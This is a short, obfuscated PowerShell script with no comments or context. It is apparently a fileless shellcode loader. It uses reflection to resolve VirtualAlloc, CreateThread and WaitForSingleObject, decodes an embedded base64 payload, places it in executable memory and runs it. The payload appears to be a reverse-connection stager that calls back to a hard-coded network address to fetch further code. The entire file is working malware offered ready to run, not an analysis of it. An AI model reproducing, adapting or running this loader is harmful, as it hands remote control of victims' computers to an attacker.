function xzpv {
	Param ($d54, $eQ)		
	$zvZ = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $zvZ.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($zvZ.GetMethod('GetModuleHandle')).Invoke($null, @($d54)))), $eQ))
}

function fhB {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $dw5,
		[Parameter(Position = 1)] [Type] $ccR = [Void]
	)
	
	$akCKb = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$akCKb.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $dw5).SetImplementationFlags('Runtime, Managed')
	$akCKb.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ccR, $dw5).SetImplementationFlags('Runtime, Managed')
	
	return $akCKb.CreateType()
}

[Byte[]]$vCRy = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUUgx0lZlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJIi1Igi0I8SAHQZoF4GAsCQVEPhXIAAACLgIgAAABIhcB0Z0gB0ItIGFBEi0AgSQHQ41ZNMclI/8lBizSISAHWSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCABFcwKiulEFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V")
		
$dE = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((xzpv kernel32.dll VirtualAlloc), (fhB @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $vCRy.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($vCRy, 0, $dE, $vCRy.length)

$giUW7 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((xzpv kernel32.dll CreateThread), (fhB @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$dE,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((xzpv kernel32.dll WaitForSingleObject), (fhB @([IntPtr], [Int32]))).Invoke($giUW7,0xffffffff) | Out-Null
